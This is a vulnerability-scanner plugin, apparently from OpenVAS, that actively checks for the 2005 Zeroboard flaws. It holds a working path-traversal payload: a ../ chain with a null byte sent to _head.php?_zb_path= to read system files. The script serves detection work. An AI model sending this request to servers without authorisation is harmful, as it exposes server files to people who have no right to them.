# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16178");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-0379", "CVE-2005-0380");
  script_xref(name:"OSVDB", value:"12925");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Zeroboard < 4.1pl6 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=110565373407474&w=2");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/12258");

  script_tag(name:"summary", value:"Zeroboard is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The remote version of this CGI is vulnerable to multiple flaws
  which may allow an attacker to execute arbitrary PHP commands on the remote host by including a
  PHP file hosted on a third-party server, or to read arbitrary files with the privileges of the
  remote web server.");

  script_tag(name:"affected", value:"Zeroboard prior to version 4.1pl6.");

  script_tag(name:"solution", value:"Update to version 4.1pl6 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir(make_list_unique("/bbs", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(port:port, item:dir + "/zboard.php?id=cgi_about");

  # e.g.:
  #
  # - >Zeroboard</a> / skin by
  # - http://zeroboard.com
  # - ZEROBOARD.COM
  #
  # as seen on e.g.:
  #
  # - view-source:https://web.archive.org/web/20041206155143/http://www.nzeo.com/bbs/zboard.php?id=cgi_about
  # - view-source:https://web.archive.org/web/20060510163404/http://www.nzeo.com/bbs/zboard.php?id=cgi_about
  #
  if(!res || res !~ "(zeroboard\.com|>Zeroboard</a>)")
    continue;

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = dir + "/_head.php?_zb_path=../../../../../../../../../../" + file + "%00";

    if(http_vuln_check(port:port, url:url, pattern:pattern)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
